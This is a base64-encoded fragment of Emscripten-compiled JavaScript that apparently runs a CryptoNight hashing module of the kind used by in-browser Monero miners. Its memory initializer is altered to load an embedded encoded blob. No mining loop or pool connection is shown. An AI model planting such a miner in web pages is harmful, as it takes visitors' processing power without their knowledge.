bik7aWYoaW5mby5lcnJubyl0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihpbmZvLmVycm5vKTtpbmZvLmFkZHI9RE5TLmxvb2t1cF9hZGRyKGluZm8uYWRkcil8fGluZm8uYWRkcjtyZXR1cm4gaW5mb30pLGdldDY0OihmdW5jdGlvbigpe3ZhciBsb3c9U1lTQ0FMTFMuZ2V0KCksaGlnaD1TWVNDQUxMUy5nZXQoKTtpZihsb3c+PTApYXNzZXJ0KGhpZ2g9PT0wKTtlbHNlIGFzc2VydChoaWdoPT09LTEpO3JldHVybiBsb3d9KSxnZXRaZXJvOihmdW5jdGlvbigpe2Fzc2VydChTWVNDQUxMUy5nZXQoKT09PTApfSl9O2Z1bmN0aW9uIF9fX3N5c2NhbGwyMCh3aGljaCx2YXJhcmdzKXtTWVNDQUxMUy52YXJhcmdzPXZhcmFyZ3M7dHJ5e3JldHVybiBQUk9DSU5GTy5waWR9Y2F0Y2goZSl7aWYodHlwZW9mIEZTPT09InVuZGVmaW5lZCJ8fCEoZSBpbnN0YW5jZW9mIEZTLkVycm5vRXJyb3IpKWFib3J0KGUpO3JldHVybi1lLmVycm5vfX12YXIgX19fdG1fY3VycmVudD1TVEFUSUNUT1A7U1RBVElDVE9QKz00ODt2YXIgX19fdG1fdGltZXpvbmU9YWxsb2NhdGUoaW50QXJyYXlGcm9tU3RyaW5nKCJHTVQiKSwiaTgiLEFMTE9DX1NUQVRJQyk7ZnVuY3Rpb24gX2dtdGltZV9yKHRpbWUsdG1QdHIpe3ZhciBkYXRlPW5ldyBEYXRlKEhFQVAzMlt0aW1lPj4yXSoxZTMpO0hFQVAzMlt0bVB0cj4+Ml09ZGF0ZS5nZXRVVENTZWNvbmRzKCk7SEVBUDMyW3RtUHRyKzQ+PjJdPWRhdGUuZ2V0VVRDTWludXRlcygpO0hFQVAzMlt0bVB0cis4Pj4yXT1kYXRlLmdldFVUQ0hvdXJzKCk7SEVBUDMyW3RtUHRyKzEyPj4yXT1kYXRlLmdldFVUQ0RhdGUoKTtIRUFQMzJbdG1QdHIrMTY+PjJdPWRhdGUuZ2V0VVRDTW9udGgoKTtIRUFQMzJbdG1QdHIrMjA+PjJdPWRhdGUuZ2V0VVRDRnVsbFllYXIoKS0xOTAwO0hFQVAzMlt0bVB0cisyND4+Ml09ZGF0ZS5nZXRVVENEYXkoKTtIRUFQMzJbdG1QdHIrMzY+PjJdPTA7SEVBUDMyW3RtUHRyKzMyPj4yXT0wO3ZhciBzdGFydD1EYXRlLlVUQyhkYXRlLmdldFVUQ0Z1bGxZZWFyKCksMCwxLDAsMCwwLDApO3ZhciB5ZGF5PShkYXRlLmdldFRpbWUoKS1zdGFydCkvKDFlMyo2MCo2MCoyNCl8MDtIRUFQMzJbdG1QdHIrMjg+PjJdPXlkYXk7SEVBUDMyW3RtUHRyKzQwPj4yXT1fX190bV90aW1lem9uZTtyZXR1cm4gdG1QdHJ9ZnVuY3Rpb24gX2dtdGltZSh0aW1lKXtyZXR1cm4gX2dtdGltZV9yKHRpbWUsX19fdG1fY3VycmVudCl9ZnVuY3Rpb24gX19fbG9jaygpe31mdW5jdGlvbiBfX191bmxvY2soKXt9ZnVuY3Rpb24gX19fc3lzY2FsbDYod2hpY2gsdmFyYXJncyl7U1lTQ0FMTFMudmFyYXJncz12YXJhcmdzO3RyeXt2YXIgc3RyZWFtPVNZU0NBTExTLmdldFN0cmVhbUZyb21GRCgpO0ZTLmNsb3NlKHN0cmVhbSk7cmV0dXJuIDB9Y2F0Y2goZSl7aWYodHlwZW9mIEZTPT09InVuZGVmaW5lZCJ8fCEoZSBpbnN0YW5jZW9mIEZTLkVycm5vRXJyb3IpKWFib3J0KGUpO3JldHVybi1lLmVycm5vfX1mdW5jdGlvbiBfZW1zY3JpcHRlbl9tZW1jcHlfYmlnKGRlc3Qsc3JjLG51bSl7SEVBUFU4LnNldChIRUFQVTguc3ViYXJyYXkoc3JjLHNyYytudW0pLGRlc3QpO3JldHVybiBkZXN0fWZ1bmN0aW9uIF9mdGltZShwKXt2YXIgbWlsbGlzPURhdGUubm93KCk7SEVBUDMyW3A+PjJdPW1pbGxpcy8xZTN8MDtIRUFQMTZbcCs0Pj4xXT1taWxsaXMlMWUzO0hFQVAxNltwKzY+PjFdPTA7SEVBUDE2W3ArOD4+MV09MDtyZXR1cm4gMH1mdW5jdGlvbiBfX19zeXNjYWxsMTQwKHdoaWNoLHZhcmFyZ3Mpe1NZU0NBTExTLnZhcmFyZ3M9dmFyYXJnczt0cnl7dmFyIHN0cmVhbT1TWVNDQUxMUy5nZXRTdHJlYW1Gcm9tRkQoKSxvZmZzZXRfaGlnaD1TWVNDQUxMUy5nZXQoKSxvZmZzZXRfbG93PVNZU0NBTExTLmdldCgpLHJlc3VsdD1TWVNDQUxMUy5nZXQoKSx3aGVuY2U9U1lTQ0FMTFMuZ2V0KCk7dmFyIG9mZnNldD1vZmZzZXRfbG93O0ZTLmxsc2VlayhzdHJlYW0sb2Zmc2V0LHdoZW5jZSk7SEVBUDMyW3Jlc3VsdD4+Ml09c3RyZWFtLnBvc2l0aW9uO2lmKHN0cmVhbS5nZXRkZW50cyYmb2Zmc2V0PT09MCYmd2hlbmNlPT09MClzdHJlYW0uZ2V0ZGVudHM9bnVsbDtyZXR1cm4gMH1jYXRjaChlKXtpZih0eXBlb2YgRlM9PT0idW5kZWZpbmVkInx8IShlIGluc3RhbmNlb2YgRlMuRXJybm9FcnJvcikpYWJvcnQoZSk7cmV0dXJuLWUuZXJybm99fWZ1bmN0aW9uIF9fX3N5c2NhbGwxNDYod2hpY2gsdmFyYXJncyl7U1lTQ0FMTFMudmFyYXJncz12YXJhcmdzO3RyeXt2YXIgc3RyZWFtPVNZU0NBTExTLmdldFN0cmVhbUZyb21GRCgpLGlvdj1TWVNDQUxMUy5nZXQoKSxpb3ZjbnQ9U1lTQ0FMTFMuZ2V0KCk7cmV0dXJuIFNZU0NBTExTLmRvV3JpdGV2KHN0cmVhbSxpb3YsaW92Y250KX1jYXRjaChlKXtpZih0eXBlb2YgRlM9PT0idW5kZWZpbmVkInx8IShlIGluc3RhbmNlb2YgRlMuRXJybm9FcnJvcikpYWJvcnQoZSk7cmV0dXJuLWUuZXJybm99fWZ1bmN0aW9uIF9fX3N5c2NhbGw1NCh3aGljaCx2YXJhcmdzKXtTWVNDQUxMUy52YXJhcmdzPXZhcmFyZ3M7dHJ5e3ZhciBzdHJlYW09U1lTQ0FMTFMuZ2V0U3RyZWFtRnJvbUZEKCksb3A9U1lTQ0FMTFMuZ2V0KCk7c3dpdGNoKG9wKXtjYXNlIDIxNTA1OntpZighc3RyZWFtLnR0eSlyZXR1cm4tRVJSTk9fQ09ERVMuRU5PVFRZO3JldHVybiAwfTtjYXNlIDIxNTA2OntpZighc3RyZWFtLnR0eSlyZXR1cm4tRVJSTk9fQ09ERVMuRU5PVFRZO3JldHVybiAwfTtjYXNlIDIxNTE5OntpZighc3RyZWFtLnR0eSlyZXR1cm4tRVJSTk9fQ09ERVMuRU5PVFRZO3ZhciBhcmdwPVNZU0NBTExTLmdldCgpO0hFQVAzMlthcmdwPj4yXT0wO3JldHVybiAwfTtjYXNlIDIxNTIwOntpZighc3RyZWFtLnR0eSlyZXR1cm4tRVJSTk9fQ09ERVMuRU5PVFRZO3JldHVybi1FUlJOT19DT0RFUy5FSU5WQUx9O2Nhc2UgMjE1MzE6e3ZhciBhcmdwPVNZU0NBTExTLmdldCgpO3JldHVybiBGUy5pb2N0bChzdHJlYW0sb3AsYXJncCl9O2Nhc2UgMjE1MjM6e2lmKCFzdHJlYW0udHR5KXJldHVybi1FUlJOT19DT0RFUy5FTk9UVFk7cmV0dXJuIDB9O2RlZmF1bHQ6YWJvcnQoImJhZCBpb2N0bCBzeXNjYWxsICIrb3ApfX1jYXRjaChlKXtpZih0eXBlb2YgRlM9PT0idW5kZWZpbmVkInx8IShlIGluc3RhbmNlb2YgRlMuRXJybm9FcnJvcikpYWJvcnQoZSk7cmV0dXJuLWUuZXJybm99fUZTLnN0YXRpY0luaXQoKTtfX0FUSU5JVF9fLnVuc2hpZnQoKGZ1bmN0aW9uKCl7aWYoIU1vZHVsZS5ub0ZTSW5pdCYmIUZTLmluaXQuaW5pdGlhbGl6ZWQpRlMuaW5pdCgpfSkpO19fQVRNQUlOX18ucHVzaCgoZnVuY3Rpb24oKXtGUy5pZ25vcmVQZXJtaXNzaW9ucz0hMX0pKTtfX0FURVhJVF9fLnB1c2goKGZ1bmN0aW9uKCl7RlMucXVpdCgpfSkpO01vZHVsZS5GU19jcmVhdGVGb2xkZXI9RlMuY3JlYXRlRm9sZGVyO01vZHVsZS5GU19jcmVhdGVQYXRoPUZTLmNyZWF0ZVBhdGg7TW9kdWxlLkZTX2NyZWF0ZURhdGFGaWxlPUZTLmNyZWF0ZURhdGFGaWxlO01vZHVsZS5GU19jcmVhdGVQcmVsb2FkZWRGaWxlPUZTLmNyZWF0ZVByZWxvYWRlZEZpbGU7TW9kdWxlLkZTX2NyZWF0ZUxhenlGaWxlPUZTLmNyZWF0ZUxhenlGaWxlO01vZHVsZS5GU19jcmVhdGVMaW5rPUZTLmNyZWF0ZUxpbms7TW9kdWxlLkZTX2NyZWF0ZURldmljZT1GUy5jcmVhdGVEZXZpY2U7TW9kdWxlLkZTX3VubGluaz1GUy51bmxpbms7X19BVElOSVRfXy51bnNoaWZ0KChmdW5jdGlvbigpe1RUWS5pbml0KCl9KSk7X19BVEVYSVRfXy5wdXNoKChmdW5jdGlvbigpe1RUWS5zaHV0ZG93bigpfSkpO2lmKEVOVklST05NRU5UX0lTX05PREUpe3ZhciBmcz1yZXF1aXJlKCJmcyIpO3ZhciBOT0RFSlNfUEFUSD1yZXF1aXJlKCJwYXRoIik7Tk9ERUZTLnN0YXRpY0luaXQoKX1EWU5BTUlDVE9QX1BUUj1hbGxvY2F0ZSgxLCJpMzIiLEFMTE9DX1NUQVRJQyk7U1RBQ0tfQkFTRT1TVEFDS1RPUD1SdW50aW1lLmFsaWduTWVtb3J5KFNUQVRJQ1RPUCk7U1RBQ0tfTUFYPVNUQUNLX0JBU0UrVE9UQUxfU1RBQ0s7RFlOQU1JQ19CQVNFPVJ1bnRpbWUuYWxpZ25NZW1vcnkoU1RBQ0tfTUFYKTtIRUFQMzJbRFlOQU1JQ1RPUF9QVFI+PjJdPURZTkFNSUNfQkFTRTtzdGF0aWNTZWFsZWQ9ITA7TW9kdWxlLndhc21UYWJsZVNpemU9MTQ7TW9kdWxlLndhc21NYXhUYWJsZVNpemU9MTQ7ZnVuY3Rpb24gaW52b2tlX2lpKGluZGV4LGExKXt0cnl7cmV0dXJuIE1vZHVsZS5keW5DYWxsX2lpKGluZGV4LGExKX1jYXRjaChlKXtpZih0eXBlb2YgZSE9PSJudW1iZXIiJiZlIT09ImxvbmdqbXAiKXRocm93IGU7TW9kdWxlLnNldFRocmV3KDEsMCl9fWZ1bmN0aW9uIGludm9rZV9paWlpKGluZGV4LGExLGEyLGEzKXt0cnl7cmV0dXJuIE1vZHVsZS5keW5DYWxsX2lpaWkoaW5kZXgsYTEsYTIsYTMpfWNhdGNoKGUpe2lmKHR5cGVvZiBlIT09Im51bWJlciImJmUhPT0ibG9uZ2ptcCIpdGhyb3cgZTtNb2R1bGUuc2V0VGhyZXcoMSwwKX19ZnVuY3Rpb24gaW52b2tlX3ZpaWkoaW5kZXgsYTEsYTIsYTMpe3RyeXtNb2R1bGUuZHluQ2FsbF92aWlpKGluZGV4LGExLGEyLGEzKX1jYXRjaChlKXtpZih0eXBlb2YgZSE9PSJudW1iZXIiJiZlIT09ImxvbmdqbXAiKXRocm93IGU7TW9kdWxlLnNldFRocmV3KDEsMCl9fU1vZHVsZS5hc21HbG9iYWxBcmc9eyJNYXRoIjpNYXRoLCJJbnQ4QXJyYXkiOkludDhBcnJheSwiSW50MTZBcnJheSI6SW50MTZBcnJheSwiSW50MzJBcnJheSI6SW50MzJBcnJheSwiVWludDhBcnJheSI6VWludDhBcnJheSwiVWludDE2QXJyYXkiOlVpbnQxNkFycmF5LCJVaW50MzJBcnJheSI6VWludDMyQXJyYXksIkZsb2F0MzJBcnJheSI6RmxvYXQzMkFycmF5LCJGbG9hdDY0QXJyYXkiOkZsb2F0NjRBcnJheSwiTmFOIjpOYU4sIkluZmluaXR5IjpJbmZpbml0eX07TW9kdWxlLmFzbUxpYnJhcnlBcmc9eyJhYm9ydCI6YWJvcnQsImFzc2VydCI6YXNzZXJ0LCJlbmxhcmdlTWVtb3J5IjplbmxhcmdlTWVtb3J5LCJnZXRUb3RhbE1lbW9yeSI6Z2V0VG90YWxNZW1vcnksImFib3J0T25DYW5ub3RHcm93TWVtb3J5IjphYm9ydE9uQ2Fubm90R3Jvd01lbW9yeSwiaW52b2tlX2lpIjppbnZva2VfaWksImludm9rZV9paWlpIjppbnZva2VfaWlpaSwiaW52b2tlX3ZpaWkiOmludm9rZV92aWlpLCJfZ210aW1lX3IiOl9nbXRpbWVfciwiX2dtdGltZSI6X2dtdGltZSwiX19fbG9jayI6X19fbG9jaywiX19fc3lzY2FsbDYiOl9fX3N5c2NhbGw2LCJfX19zZXRFcnJObyI6X19fc2V0RXJyTm8sIl9fX3VubG9jayI6X19fdW5sb2NrLCJfZnRpbWUiOl9mdGltZSwiX2Vtc2NyaXB0ZW5fbWVtY3B5X2JpZyI6X2Vtc2NyaXB0ZW5fbWVtY3B5X2JpZywiX19fc3lzY2FsbDU0IjpfX19zeXNjYWxsNTQsIl9fX3N5c2NhbGwxNDAiOl9fX3N5c2NhbGwxNDAsIl9fX3N5c2NhbGwyMCI6X19fc3lzY2FsbDIwLCJfX19hc3NlcnRfZmFpbCI6X19fYXNzZXJ0X2ZhaWwsIl9fX3N5c2NhbGwxNDYiOl9fX3N5c2NhbGwxNDYsIkRZTkFNSUNUT1BfUFRSIjpEWU5BTUlDVE9QX1BUUiwidGVtcERvdWJsZVB0ciI6dGVtcERvdWJsZVB0ciwiQUJPUlQiOkFCT1JULCJTVEFDS1RPUCI6U1RBQ0tUT1AsIlNUQUNLX01BWCI6U1RBQ0tfTUFYfTt2YXIgYXNtPU1vZHVsZS5hc20oTW9kdWxlLmFzbUdsb2JhbEFyZyxNb2R1bGUuYXNtTGlicmFyeUFyZyxidWZmZXIpO01vZHVsZS5hc209YXNtO3ZhciBfY3J5cHRvbmlnaHRfaGFzaD1Nb2R1bGUuX2NyeXB0b25pZ2h0X2hhc2g9KGZ1bmN0aW9uKCl7cmV0dXJuIE1vZHVsZS5hc20uX2NyeXB0b25pZ2h0X2hhc2guYXBwbHkobnVsbCxhcmd1bWVudHMpfSk7dmFyIGdldFRlbXBSZXQwPU1vZHVsZS5nZXRUZW1wUmV0MD0oZnVuY3Rpb24oKXtyZXR1cm4gTW9kdWxlLmFzbS5nZXRUZW1wUmV0MC5hcHBseShudWxsLGFyZ3VtZW50cyl9KTt2YXIgX2ZyZWU9TW9kdWxlLl9mcmVlPShmdW5jdGlvbigpe3JldHVybiBNb2R1bGUuYXNtLl9mcmVlLmFwcGx5KG51bGwsYXJndW1lbnRzKX0pO3ZhciBydW5Qb3N0U2V0cz1Nb2R1bGUucnVuUG9zdFNldHM9KGZ1bmN0aW9uKCl7cmV0dXJuIE1vZHVsZS5hc20ucnVuUG9zdFNldHMuYXBwbHkobnVsbCxhcmd1bWVudHMpfSk7dmFyIHNldFRlbXBSZXQwPU1vZHVsZS5zZXRUZW1wUmV0MD0oZnVuY3Rpb24oKXtyZXR1cm4gTW9kdWxlLmFzbS5zZXRUZW1wUmV0MC5hcHBseShudWxsLGFyZ3VtZW50cyl9KTt2YXIgZXN0YWJsaXNoU3RhY2tTcGFjZT1Nb2R1bGUuZXN0YWJsaXNoU3RhY2tTcGFjZT0oZnVuY3Rpb24oKXtyZXR1cm4gTW9kdWxlLmFzbS5lc3RhYmxpc2hTdGFja1NwYWNlLmFwcGx5KG51bGwsYXJndW1lbnRzKX0pO3ZhciBfbWVtbW92ZT1Nb2R1bGUuX21lbW1vdmU9KGZ1bmN0aW9uKCl7cmV0dXJuIE1vZHVsZS5hc20uX21lbW1vdmUuYXBwbHkobnVsbCxhcmd1bWVudHMpfSk7dmFyIHN0YWNrU2F2ZT1Nb2R1bGUuc3RhY2tTYXZlPShmdW5jdGlvbigpe3JldHVybiBNb2R1bGUuYXNtLnN0YWNrU2F2ZS5hcHBseShudWxsLGFyZ3VtZW50cyl9KTt2YXIgX21lbXNldD1Nb2R1bGUuX21lbXNldD0oZnVuY3Rpb24oKXtyZXR1cm4gTW9kdWxlLmFzbS5fbWVtc2V0LmFwcGx5KG51bGwsYXJndW1lbnRzKX0pO3ZhciBfbWFsbG9jPU1vZHVsZS5fbWFsbG9jPShmdW5jdGlvbigpe3JldHVybiBNb2R1bGUuYXNtLl9tYWxsb2MuYXBwbHkobnVsbCxhcmd1bWVudHMpfSk7dmFyIF9jcnlwdG9uaWdodF9jcmVhdGU9TW9kdWxlLl9jcnlwdG9uaWdodF9jcmVhdGU9KGZ1bmN0aW9uKCl7cmV0dXJuIE1vZHVsZS5hc20uX2NyeXB0b25pZ2h0X2NyZWF0ZS5hcHBseShudWxsLGFyZ3VtZW50cyl9KTt2YXIgX21lbWNweT1Nb2R1bGUuX21lbWNweT0oZnVuY3Rpb24oKXtyZXR1cm4gTW9kdWxlLmFzbS5fbWVtY3B5LmFwcGx5KG51bGwsYXJndW1lbnRzKX0pO3ZhciBfZW1zY3JpcHRlbl9nZXRfZ2xvYmFsX2xpYmM9TW9kdWxlLl9lbXNjcmlwdGVuX2dldF9nbG9iYWxfbGliYz0oZnVuY3Rpb24oKXtyZXR1cm4gTW9kdWxlLmFzbS5fZW1zY3JpcHRlbl9nZXRfZ2xvYmFsX2xpYmMuYXBwbHkobnVsbCxhcmd1bWVudHMpfSk7dmFyIHN0YWNrQWxsb2M9TW9kdWxlLnN0YWNrQWxsb2M9KGZ1bmN0aW9uKCl7cmV0dXJuIE1vZHVsZS5hc20uc3RhY2tBbGxvYy5hcHBseShudWxsLGFyZ3VtZW50cyl9KTt2YXIgc2V0VGhyZXc9TW9kdWxlLnNldFRocmV3PShmdW5jdGlvbigpe3JldHVybiBNb2R1bGUuYXNtLnNldFRocmV3LmFwcGx5KG51bGwsYXJndW1lbnRzKX0pO3ZhciBfc2Jyaz1Nb2R1bGUuX3Nicms9KGZ1bmN0aW9uKCl7cmV0dXJuIE1vZHVsZS5hc20uX3NicmsuYXBwbHkobnVsbCxhcmd1bWVudHMpfSk7dmFyIF9mZmx1c2g9TW9kdWxlLl9mZmx1c2g9KGZ1bmN0aW9uKCl7cmV0dXJuIE1vZHVsZS5hc20uX2ZmbHVzaC5hcHBseShudWxsLGFyZ3VtZW50cyl9KTt2YXIgc3RhY2tSZXN0b3JlPU1vZHVsZS5zdGFja1Jlc3RvcmU9KGZ1bmN0aW9uKCl7cmV0dXJuIE1vZHVsZS5hc20uc3RhY2tSZXN0b3JlLmFwcGx5KG51bGwsYXJndW1lbnRzKX0pO3ZhciBfY3J5cHRvbmlnaHRfZGVzdHJveT1Nb2R1bGUuX2NyeXB0b25pZ2h0X2Rlc3Ryb3k9KGZ1bmN0aW9uKCl7cmV0dXJuIE1vZHVsZS5hc20uX2NyeXB0b25pZ2h0X2Rlc3Ryb3kuYXBwbHkobnVsbCxhcmd1bWVudHMpfSk7dmFyIF9fX2Vycm5vX2xvY2F0aW9uPU1vZHVsZS5fX19lcnJub19sb2NhdGlvbj0oZnVuY3Rpb24oKXtyZXR1cm4gTW9kdWxlLmFzbS5fX19lcnJub19sb2NhdGlvbi5hcHBseShudWxsLGFyZ3VtZW50cyl9KTt2YXIgZHluQ2FsbF9paT1Nb2R1bGUuZHluQ2FsbF9paT0oZnVuY3Rpb24oKXtyZXR1cm4gTW9kdWxlLmFzbS5keW5DYWxsX2lpLmFwcGx5KG51bGwsYXJndW1lbnRzKX0pO3ZhciBkeW5DYWxsX2lpaWk9TW9kdWxlLmR5bkNhbGxfaWlpaT0oZnVuY3Rpb24oKXtyZXR1cm4gTW9kdWxlLmFzbS5keW5DYWxsX2lpaWkuYXBwbHkobnVsbCxhcmd1bWVudHMpfSk7dmFyIGR5bkNhbGxfdmlpaT1Nb2R1bGUuZHluQ2FsbF92aWlpPShmdW5jdGlvbigpe3JldHVybiBNb2R1bGUuYXNtLmR5bkNhbGxfdmlpaS5hcHBseShudWxsLGFyZ3VtZW50cyl9KTtSdW50aW1lLnN0YWNrQWxsb2M9TW9kdWxlLnN0YWNrQWxsb2M7UnVudGltZS5zdGFja1NhdmU9TW9kdWxlLnN0YWNrU2F2ZTtSdW50aW1lLnN0YWNrUmVzdG9yZT1Nb2R1bGUuc3RhY2tSZXN0b3JlO1J1bnRpbWUuZXN0YWJsaXNoU3RhY2tTcGFjZT1Nb2R1bGUuZXN0YWJsaXNoU3RhY2tTcGFjZTtSdW50aW1lLnNldFRlbXBSZXQwPU1vZHVsZS5zZXRUZW1wUmV0MDtSdW50aW1lLmdldFRlbXBSZXQwPU1vZHVsZS5nZXRUZW1wUmV0MDtNb2R1bGUuYXNtPWFzbTtpZihtZW1vcnlJbml0aWFsaXplcil7aWYodHlwZW9mIE1vZHVsZS5sb2NhdGVGaWxlPT09ImZ1bmN0aW9uIil7bWVtb3J5SW5pdGlhbGl6ZXI9TW9kdWxlLmxvY2F0ZUZpbGUobWVtb3J5SW5pdGlhbGl6ZXIpfWVsc2UgaWYoTW9kdWxlLm1lbW9yeUluaXRpYWxpemVyUHJlZml4VVJMKXttZW1vcnlJbml0aWFsaXplcj1Nb2R1bGUubWVtb3J5SW5pdGlhbGl6ZXJQcmVmaXhVUkwrbWVtb3J5SW5pdGlhbGl6ZXJ9aWYoRU5WSVJPTk1FTlRfSVNfTk9ERXx8RU5WSVJPTk1FTlRfSVNfU0hFTEwpe3ZhciBkYXRhPU1vZHVsZS5yZWFkQmluYXJ5KG1lbW9yeUluaXRpYWxpemVyKTtIRUFQVTguc2V0KGRhdGEsUnVudGltZS5HTE9CQUxfQkFTRSl9ZWxzZXthZGRSdW5EZXBlbmRlbmN5KCJtZW1vcnkgaW5pdGlhbGl6ZXIiKTt2YXIgYXBwbHlNZW1vcnlJbml0aWFsaXplcj0oZnVuY3Rpb24oZGF0YSl7dmFyIGJhcmY9VWludDhBcnJheS5mcm9tKGF0b2IocmF3KSxjPT5jLmNoYXJDb2RlQXQoMCkpCkhFQVBVOC5zZXQoYmFyZixSdW50aW1lLkdMT0JBTF9CQVNFKTtpZihNb2R1bGUubWVtb3J5SW5pdGlhbGl6ZXJSZXF1ZXN0KWRlbGV0ZSBNb2R1bGUubWVtb3J5SW5pdGlhbGl6ZXJSZXF1ZXN0LnJlc3BvbnNlO3JlbW92ZVJ1bkRlcGVuZGVuY3koIm1lbW9yeSBpbml0aWFsaXplciIpfSk7ZnVuY3Rpb24gZG9Ccm93c2VyTG9hZCgpe3NldFRpbWVvdXQoZnVuY3Rpb24oKXthcHBseU1lbW9yeUluaXRpYWxpemVyKCl9LDIwKX0KaWYoTW9kdWxlLm1lbW9yeUluaXRpYWxpemVyUmVxdWVzdCl7ZnVuY3Rpb24gdXNlUmVxdWVzdCgpe3ZhciByZXF1ZXN0PU1vZHVsZS5tZW1vcnlJbml0aWFsaXplclJlcXVlc3Q7aWYocmVxdWVzdC5zdGF0dXMhPT0yMDAmJnJlcXVlc3Quc3RhdHVzIT09MCl7Y29uc29sZS53YXJuKCJhIHByb2JsZW0gc2VlbXMgdG8gaGF2ZSBoYXBwZW5lZCB3aXRoIE1vZHVsZS5tZW1vcnlJbml0aWFsaXplclJlcXVlc3QsIHN0YXR1czogIityZXF1ZXN0LnN0YXR1cysiLCByZXRyeWluZyAiK21lbW9yeUluaXRpYWxpemVyKTtkb0Jyb3dzZXJMb2FkKCk7cmV0dXJufQphcHBseU1lbW9yeUluaXRpYWxpemVyKHJlcXVlc3QucmVzcG9uc2UpfQppZihNb2R1bGUubWVtb3J5SW5pdGlhbGl6ZXJSZXF1ZXN0LnJlc3BvbnNlKXtzZXRUaW1lb3V0KHVzZVJlcXVlc3QsMCl9ZWxzZXtNb2R1bGUubWVtb3J5SW5pdGlhbGl6ZXJSZXF1ZXN0LmFkZEV2ZW50TGlzdGVuZXIoImxvYWQiLHVzZVJlcXVlc3QpfX1lbHNle2RvQnJvd3NlckxvYWQoKX19fQpmdW5jdGlvbiBFeGl0U3RhdHVzKHN0YXR1cyl7dGhpcy5uYW1lPSJFeGl0U3RhdHVzIjt0aGlzLm1lc3NhZ2U9IlByb2dyYW0gdGVybWluYXRlZCB3aXRoIGV4aXQoIitzdGF0dXMrIikiO3RoaXMuc3RhdHVzPXN0YXR1c30KRXhpdFN0YXR1cy5wcm90b3R5cGU9bmV3IEVycm9yO0V4aXRTdGF0dXMucHJvdG90eXBlLmNvbnN0cnVjdG9yPUV4aXRTdGF0dXM7dmFyIGluaXRpYWxTdGFja1RvcDt2YXIgcHJlbG9hZFN0YXJ0VGltZT1udWxsO3ZhciBjYWxsZWRNYWluPSExO2RlcGVuZGVuY2llc0Z1bGZpbGxlZD1mdW5jdGlvbiBydW5DYWxsZXIoKXtpZighTW9kdWxlLmNhbGxlZFJ1bilydW4oKTtpZighTW9kdWxlLmNhbGxlZFJ1bilkZXBlbmRlbmNpZXNGdWxmaWxsZWQ9cnVuQ2FsbGVyfTtNb2R1bGUuY2FsbE1haW49TW9kdWxlLmNhbGxNYWluPWZ1bmN0aW9uIGNhbGxNYWluKGFyZ3Mpe2FyZ3M9YXJnc3x8W107ZW5zdXJlSW5pdFJ1bnRpbWUoKTt2YXIgYXJnYz1hcmdzLmxlbmd0aCsxO2Z1bmN0aW9uIHBhZCgpe2Zvcih2YXIgaT0wO2k8NC0xO2krKyl7YXJndi5wdXNoKDApfX12YXIgYXJndj1bYWxsb2NhdGUoaW50QXJyYXlGcm9tU3RyaW5nKE1vZHVsZS50aGlzUHJvZ3JhbSksImk4IixBTExPQ19OT1JNQUwpXTtwYWQoKTtmb3IodmFyIGk9MDtpPGFyZ2MtMTtpPWkrMSl7YXJndi5wdXNoKGFsbG9jYXRlKGludEFycmF5RnJvbVN0cmluZyhhcmdzW2ldKSwiaTgiLEFMTE9DX05PUk1BTCkpO3BhZCgpfWFyZ3YucHVzaCgwKTthcmd2PWFsbG9jYXRlKGFyZ3YsImkzMiIsQUxMT0NfTk9STUFMKTt0cnl7dmFyIHJldD1Nb2R1bGUuX21haW4oYXJnYyxhcmd2LDApO2V4aXQocmV0LCEwKX1jYXRjaChlKXtpZihlIGluc3RhbmNlb2YgRXhpdFN0YXR1cyl7cmV0dXJufWVsc2UgaWYoZT09IlNpbXVsYXRlSW5maW5pdGVMb29wIil7TW9kdWxlLm5vRXhpdFJ1bnRpbWU9ITA7cmV0dXJufWVsc2V7dmFyIHRvTG9nPWU7aWYoZSYmdHlwZW9mIGU9PT0ib2JqZWN0IiYmZS5zdGFjayl7dG9Mb2c9W2UsZS5zdGFja119TW9kdWxlLnByaW50RXJyKCJleGNlcHRpb24gdGhyb3duOiAiK3RvTG9nKTtNb2R1bGUucXVpdCgxLGUpfX1maW5hbGx5e2NhbGxlZE1haW49ITB9fTtmdW5jdGlvbiBydW4oYXJncyl7YXJncz1hcmdzfHxNb2R1bGVbImFyZ3VtZW50cyJdO2lmKHByZWxvYWRTdGFydFRpbWU9PT1udWxsKXByZWxvYWRTdGFydFRpbWU9RGF0ZS5ub3coKTtpZihydW5EZXBlbmRlbmNpZXM+MCl7cmV0dXJufXByZVJ1bigpO2lmKHJ1bkRlcGVuZGVuY2llcz4wKXJldHVybjtpZihNb2R1bGUuY2FsbGVkUnVuKXJldHVybjtmdW5jdGlvbiBkb1J1bigpe2lmKE1vZHVsZS5jYWxsZWRSdW4pcmV0dXJuO01vZHVsZS5jYWxsZWRSdW49ITA7aWYoQUJPUlQpcmV0dXJuO2Vuc3VyZUluaXRSdW50aW1lKCk7cHJlTWFpbigpO2lmKE1vZHVsZS5vblJ1bnRpbWVJbml0aWFsaXplZClNb2R1bGUub25SdW50aW1lSW5pdGlhbGl6ZWQoKTtpZihNb2R1bGUuX21haW4mJnNob3VsZFJ1bk5vdylNb2R1bGUuY2FsbE1haW4oYXJncyk7cG9zdFJ1bigpfWlmKE1vZHVsZS5zZXRTdGF0dXMpe01vZHVsZS5zZXRTdGF0dXMoIlJ1bm5pbmcuLi4iKTtzZXRUaW1lb3V0KChmdW5jdGlvbigpe3NldFRpbWVvdXQoKGZ1bmN0aW9uKCl7TW9kdWxlLnNldFN0YXR1cygiIil9KSwxKTtkb1J1bigpfSksMSl9ZWxzZXtkb1J1bigpfX1Nb2R1bGUucnVuPU1vZHVsZS5ydW49cnVuO2Z1bmN0aW9uIGV4aXQoc3RhdHVzLGltcGxpY2l0KXtpZihpbXBsaWNpdCYmTW9kdWxlLm5vRXhpdFJ1bnRpbWUpe3JldHVybn1pZihNb2R1bGUubm9FeGl0UnVudGltZSl7fWVsc2V7QUJPUlQ9ITA7RVhJVFNUQVRVUz1zdGF0dXM7U1RBQ0tUT1A9aW5pdGlhbFN0YWNrVG9wO2V4aXRSdW50aW1lKCk7aWYoTW9kdWxlLm9uRXhpdClNb2R1bGUub25FeGl0KHN0YXR1cyl9aWYoRU5WSVJPTk1FTlRfSVNfTk9ERSl7cHJvY2Vzcy5leGl0KHN0YXR1cyl9TW9kdWxlLnF1aXQoc3RhdHVzLG5ldyBFeGl0U3RhdHVzKHN0YXR1cykpfU1vZHVsZS5leGl0PU1vZHVsZS5leGl0PWV4aXQ7dmFyIGFib3J0RGVjb3JhdG9ycz1bXTtmdW5jdGlvbiBhYm9ydCh3aGF0KXtpZihNb2R1bGUub25BYm9ydCl7T